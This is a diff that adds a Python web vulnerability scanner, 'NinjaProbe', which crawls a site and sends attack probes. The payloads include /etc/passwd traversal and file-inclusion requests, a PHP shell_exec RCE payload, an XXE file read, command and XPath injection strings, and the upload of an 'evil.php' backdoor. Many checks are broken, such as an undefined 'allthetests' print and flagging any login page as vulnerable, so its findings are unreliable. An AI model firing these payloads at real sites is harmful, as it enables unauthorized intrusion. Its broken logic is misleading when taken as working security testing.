@@ -1,0 +1,288 @@
+# 
+print(" _   _ _       _        ______          _          ")
+print("| \ | (_)     (_)       | ___ \        | |         ")
+print("|  \| |_ _ __  _  __ _  | |_/ / __ ___ | |__   ___ ")
+print("| . ` | | '_ \| |/ _` | |  __/ '__/ _ \| '_ \ / _ \")
+print("| |\  | | | | | | (_| | | |  | | | (_) | |_) |  __/")
+print("\_| \_/_|_| |_| |\__,_| \_|  |_|  \___/|_.__/ \___|")
+print("             _/ |                                  ")
+print("            |__/                                   ") 
+print("   + https://github.com/sambitpoddar/ninjaprobe +  ")
+print("                                                   ")
+print(allthetests)
+comment = '''
+[!] List of Vulnerability Tests (Select with Caution)
+1. SQL Injection                             16. Missing Security Headers
+2. Cross-Site Scripting (XSS)                17. Server-Side Request Forgery (SSRF)
+3. Cross-Site Request Forgery (CSRF)         18. XML Injection
+4. Directory Traversal                       19. File Inclusion
+5. Remote Code Execution                     20. OS Command Injection
+6. Insecure File Upload                      21. Server-Side Template Injection (SSTI)
+7. Insecure Direct Object References (IDOR)  22. Server-Side Request (SSR)
+8. XML External Entities (XXE).              23. Mass Assignment
+9. Insecure Cryptographic Implementations.   24. XPath Injection
+10. Insecure Deserialization                 25. Local File Inclusion (LFI)
+11. Insecure Redirect                        26. Clickjacking
+12. Weak Password Policy                     27. Insecure Cookies
+13. Sensitive Data Exposure                  28. Insecure Login Page
+14. SSL/TLS Issues                           29. Misconfigured Security Headers
+15. Insecure CORS Policy                     30. Weak Cryptography
+                                             31. Session Fixation
+
+'''
+
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import re
+import concurrent.futures
+
+class WebsiteVulnerabilityScanner:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.session = requests.Session()
+        self.links_to_scan = set()
+        self.vulnerable_links = set()
+        self.links_to_ignore = ['logout.php', 'register.php']  # URLs to ignore during scanning
+
+    def extract_links(self, url):
+        response = self.session.get(url)
+        soup = BeautifulSoup(response.content, "html.parser")
+        return [urljoin(url, link.get("href")) for link in soup.find_all("a", href=True)]
+
+    def crawl(self, url=None):
+        if url is None:
+            url = self.target_url
+        links = self.extract_links(url)
+        for link in links:
+            if link in self.links_to_ignore:
+                continue
+            if self.target_url in link:
+                self.links_to_scan.add(link)
+
+    def test_sql_injection(self, url):
+        response = self.session.get(url)
+        if re.search(r"SQL syntax.*MySQL", response.text):
+            self.vulnerable_links.add(url)
+
+    def test_xss(self, url):
+        response = self.session.get(url)
+        if "<script>alert(" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_csrf(self, url):
+        response = self.session.get(url)
+        if "csrf_token" not in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_directory_traversal(self, url):
+        response = self.session.get(url + "../../../../etc/passwd")
+        if "root:" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_remote_code_execution(self, url):
+        payload = "<?php echo shell_exec('id'); ?>"
+        response = self.session.post(url, data={'code': payload})
+        if "uid=" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_file_upload(self, url):
+        files = {'file': open('evil.php', 'rb')}  # Replace 'evil.php' with a file containing malicious code like backdoor
+        response = self.session.post(url, files=files)
+        if "evil.php" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_idor(self, url):
+        response = self.session.get(url + "/user_profile?id=1")
+        if "user_profile" in response.url:
+            self.vulnerable_links.add(url)
+
+    def test_xxe(self, url):
+        payload = """<?xml version="1.0"?>
+        <!DOCTYPE data [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <data>&xxe;</data>"""
+        headers = {'Content-Type': 'application/xml'}
+        response = self.session.post(url, data=payload, headers=headers)
+        if "root:" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_crypto(self, url):
+        response = self.session.get(url)
+        if "md5(" in response.text or "SHA1(" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_deserialization(self, url):
+        response = self.session.get(url)
+        if "pickle" in response.text or "marshmallow" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_redirect(self, url):
+        response = self.session.get(url, allow_redirects=False)
+        if response.status_code == 302 and "example.com" not in response.headers.get('Location', ''):
+            self.vulnerable_links.add(url)
+
+    def test_weak_password_policy(self, url):
+        response = self.session.post(url, data={'username': 'admin', 'password': 'password'})
+        if "Invalid password" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_sensitive_data_exposure(self, url):
+        response = self.session.get(url)
+        if "API_KEY" in response.text or "password" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_ssl_tls_issues(self, url):
+        response = self.session.get(url, verify=False)
+        if "CERTIFICATE_VERIFY_FAILED" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_cors_policy(self, url):
+        response = self.session.get(url)
+        if "Access-Control-Allow-Origin: *" in response.headers:
+            self.vulnerable_links.add(url)
+
+    def test_security_headers_missing(self, url):
+        response = self.session.get(url)
+        if "X-Frame-Options" not in response.headers or "Content-Security-Policy" not in response.headers:
+            self.vulnerable_links.add(url)
+
+    def test_server_side_request_forgery(self, url):
+        response = self.session.get(url + "/?url=http://localhost:8080")
+        if "localhost" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_xml_injection(self, url):
+        payload = "<user><name>John</name><age>20</age></user>"
+        response = self.session.post(url, data=payload)
+        if "John" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_file_inclusion(self, url):
+        response = self.session.get(url + "?file=../../../../etc/passwd")
+        if "root:" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_os_command_injection(self, url):
+        payload = "127.0.0.1; ls -la"
+        response = self.session.get(url + "?ip=" + payload)
+        if "passwd" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_ssti(self, url):
+        payload = "{{ 7*'7' }}"
+        response = self.session.get(url + "?name=" + payload)
+        if "7777777" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_ssr(self, url):
+        response = self.session.get(url + "/?url=http://localhost:8080")
+        if "localhost" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_mass_assignment(self, url):
+        response = self.session.post(url, data={'admin': 'true'})
+        if "Welcome admin" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_xpath_injection(self, url):
+        payload = "' or 1=1 or ''='"
+        response = self.session.post(url, data={'username': payload, 'password': 'password'})
+        if "Welcome admin" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_lfi(self, url):
+        response = self.session.get(url + "?file=../../../../etc/passwd")
+        if "root:" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_clickjacking(self, url):
+        response = self.session.get(url)
+        if "X-Frame-Options" not in response.headers or "DENY" not in response.headers["X-Frame-Options"]:
+            self.vulnerable_links.add(url)
+
+    def test_insecure_cookies(self, url):
+        response = self.session.get(url)
+        if "HttpOnly" not in response.cookies.get_dict():
+            self.vulnerable_links.add(url)
+
+    def test_insecure_login_page(self, url):
+        response = self.session.get(url)
+        if "login" in response.url.lower() or "signin" in response.url.lower():
+            self.vulnerable_links.add(url)
+
+    def test_misconfigured_security_headers(self, url):
+        response = self.session.get(url)
+        if "Content-Security-Policy" not in response.headers or "X-XSS-Protection" not in response.headers:
+            self.vulnerable_links.add(url)
+
+    def test_weak_cryptography(self, url):
+        response = self.session.get(url)
+        if "md5(" in response.text or "SHA1(" in response.text or "base64" in response.text:
+            self.vulnerable_links.add(url)
+
+    def test_session_fixation(self, url):
+        response = self.session.get(url)
+        if "Set-Cookie" in response.headers and "HttpOnly" not in response.headers["Set-Cookie"]:
+            self.vulnerable_links.add(url)
+
+    def test_vulnerabilities(self, tests):
+        tests_mapping = {
+            1: self.test_sql_injection,
+            2: self.test_xss,
+            3: self.test_csrf,
+            4: self.test_directory_traversal,
+            5: self.test_remote_code_execution,
+            6: self.test_insecure_file_upload,
+            7: self.test_idor,
+            8: self.test_xxe,
+            9: self.test_insecure_crypto,
+            10: self.test_insecure_deserialization,
+            11: self.test_insecure_redirect,
+            12: self.test_weak_password_policy,
+            13: self.test_sensitive_data_exposure,
+            14: self.test_ssl_tls_issues,
+            15: self.test_insecure_cors_policy,
+            16: self.test_security_headers_missing,
+            17: self.test_server_side_request_forgery,
+            18: self.test_xml_injection,
+            19: self.test_file_inclusion,
+            20: self.test_os_command_injection,
+            21: self.test_ssti,
+            22: self.test_ssr,
+            23: self.test_mass_assignment,
+            24: self.test_xpath_injection,
+            25: self.test_lfi,
+            26: self.test_clickjacking,
+            27: self.test_insecure_cookies,
+            28: self.test_insecure_login_page,
+            29: self.test_misconfigured_security_headers,
+            30: self.test_weak_cryptography,
+            31: self.test_session_fixation,
+        }
+        for test_number in tests:
+            tests_mapping[test_number](self.target_url)
+
+    def scan(self):
+        self.crawl()
+        all_tests = input("Do you want to run all tests? (yes/no): ").lower()
+        if all_tests == "yes":
+            tests_to_run = [i for i in range(1, 32)]  # Run all tests
+        else:
+            custom_tests = input("Enter the numbers of tests to run (separated by commas): ")
+            tests_to_run = [int(num) for num in custom_tests.split(",")]
+        self.test_vulnerabilities(tests_to_run)
+        if self.vulnerable_links:
+            print("Vulnerabilities found:")
+            for link in self.vulnerable_links:
+                print(link)
+        else:
+            print("No vulnerabilities found.")
+
+# Example usage:
+if __name__ == "__main__":
+    url = input("Enter the website URL: ")
+    scanner = WebsiteVulnerabilityScanner(url)
+    scanner.scan()
+
